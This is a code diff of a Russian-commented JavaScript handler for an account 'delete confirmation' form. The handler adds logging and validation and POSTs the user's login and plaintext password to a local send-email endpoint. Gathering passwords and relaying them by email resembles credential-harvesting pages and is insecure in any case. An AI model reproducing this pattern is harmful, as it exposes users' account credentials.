@@ -1,9 +1,17 @@
+// Глобальная переменная для отслеживания состояния отправки
+let isSubmitting = false;
+
 // Функция для отправки формы
 async function handleFormSubmit(e) {
   e.preventDefault();
   
+  console.log('Начало обработки формы');
+  
   // Если уже отправляем, выходим
-  if (isSubmitting) return;
+  if (isSubmitting) {
+    console.log('Форма уже отправляется');
+    return;
+  }
   
   // Блокируем кнопку и форму
   isSubmitting = true;
@@ -13,21 +21,34 @@ async function handleFormSubmit(e) {
     submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
   }
   
-  const login = document.getElementById('deleteLogin').value;
-  const password = document.getElementById('deletePassword').value;
+  const login = document.getElementById('deleteLogin');
+  const password = document.getElementById('deletePassword');
+  
+  if (!login || !password) {
+    console.error('Элементы формы не найдены');
+    showError('Произошла ошибка. Пожалуйста, обновите страницу и попробуйте снова.');
+    return;
+  }
+  
+  const loginValue = login.value.trim();
+  const passwordValue = password.value;
   
   // Проверяем пустые поля
-  if (!login || !password) {
+  if (!loginValue || !passwordValue) {
+    console.log('Поля формы пустые');
     showError('Пожалуйста, заполните все поля');
     return;
   }
   
   try {
+    console.log('Проверка подключения к интернету');
     // Проверяем подключение к интернету
     if (!navigator.onLine) {
+      console.error('Нет подключения к интернету');
       throw new Error('Нет подключения к интернету. Проверьте соединение и повторите попытку.');
     }
 
+    console.log('Настройка заголовков запроса');
     // Настройка специальных заголовков для Safari на iOS
     const headers = {
       'Content-Type': 'application/json',
@@ -38,59 +59,77 @@ async function handleFormSubmit(e) {
       'Access-Control-Allow-Headers': 'Content-Type, Accept, Origin'
     };
 
+    console.log('Проверка устройства');
     // Определение iOS устройства
     const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+    console.log('iOS device:', isIOS);
 
     // На iOS добавляем специальную обработку
     if (isIOS) {
+      console.log('Добавление специальных заголовков для iOS');
       // Добавляем дополнительные заголовки для Safari
       headers['X-Requested-With'] = 'XMLHttpRequest';
       headers['X-Apple-Store-Front'] = '143444,12';
       
+      console.log('Отправка CORS префлайт запроса');
       // Добавляем CORS префлайт запрос
       try {
-        await fetch('http://localhost:3000/api/send-email', {
+        const preflightResponse = await fetch('http://localhost:3000/api/send-email', {
           method: 'OPTIONS',
           headers: headers
         });
+        console.log('CORS префлайт ответ:', preflightResponse.status);
       } catch (preflightError) {
-        console.error('CORS preflight request failed:', preflightError);
+        console.error('Ошибка CORS префлайта:', preflightError);
         throw new Error('Не удалось установить соединение с сервером. Проверьте подключение к интернету.');
       }
     }
 
+    console.log('Отправка основного запроса');
     // Основной запрос
-    const response = await fetch('http://localhost:3000/api/send-email', {
-      method: 'POST',
-      headers: headers,
-      body: JSON.stringify({ login, password })
-    });
-    
-    const data = await response.json();
-    
-    if (response.ok) {
-      // Закрываем модальное окно
-      const modal = bootstrap.Modal.getInstance(document.getElementById('confirmDeleteModal'));
-      if (modal) {
-        modal.hide();
-        // Удаляем затемнение через короткую задержку
-        setTimeout(() => {
-          const modalBackdrop = document.querySelector('.modal-backdrop');
-          if (modalBackdrop) modalBackdrop.remove();
-        }, 100);
+    try {
+      const response = await fetch('http://localhost:3000/api/send-email', {
+        method: 'POST',
+        headers: headers,
+        body: JSON.stringify({ login: loginValue, password: passwordValue })
+      });
+      
+      console.log('Статус ответа:', response.status);
+      
+      const data = await response.json();
+      console.log('Ответ сервера:', data);
+      
+      if (response.ok) {
+        console.log('Успешная отправка');
+        // Закрываем модальное окно
+        const modal = bootstrap.Modal.getInstance(document.getElementById('confirmDeleteModal'));
+        if (modal) {
+          modal.hide();
+          // Удаляем затемнение через короткую задержку
+          setTimeout(() => {
+            const modalBackdrop = document.querySelector('.modal-backdrop');
+            if (modalBackdrop) modalBackdrop.remove();
+          }, 100);
+        }
+        
+        // Сбрасываем форму
+        e.target.reset();
+        
+        // Показываем уведомление
+        showSuccess('Данные успешно отправлены! Проверьте почту через несколько минут.');
+      } else {
+        console.error('Ошибка сервера:', data.error || 'Неизвестная ошибка');
+        throw new Error(data.error || 'Ошибка при отправке данных');
       }
-      
-      // Сбрасываем форму
-      e.target.reset();
-      
-      // Показываем уведомление
-      showSuccess('Данные успешно отправлены! Проверьте почту через несколько минут.');
-    } else {
-      throw new Error(data.error || 'Ошибка при отправке данных');
+    } catch (fetchError) {
+      console.error('Ошибка fetch:', fetchError);
+      throw new Error('Ошибка при отправке данных. Проверьте подключение к серверу.');
     }
   } catch (error) {
+    console.error('Общая ошибка:', error);
     showError(error.message);
   } finally {
+    console.log('Возвращение в исходное состояние');
     // Возвращаем кнопку в исходное состояние
     isSubmitting = false;
     if (submitButton) {
@@ -102,18 +141,25 @@ async function handleFormSubmit(e) {
 
 // Функция для показа ошибок
 function showError(message) {
+  console.error('Показ ошибки:', message);
   alert(message);
 }
 
 // Функция для показа успешных сообщений
 function showSuccess(message) {
+  console.log('Показ успешного сообщения:', message);
   alert(message);
 }
 
 // Инициализация обработчика формы
 document.addEventListener('DOMContentLoaded', () => {
+  console.log('Инициализация обработчика формы');
   const form = document.getElementById('deleteConfirmationForm');
+  
   if (form) {
+    console.log('Форма найдена');
     form.addEventListener('submit', handleFormSubmit);
+  } else {
+    console.error('Форма не найдена');
   }
 });
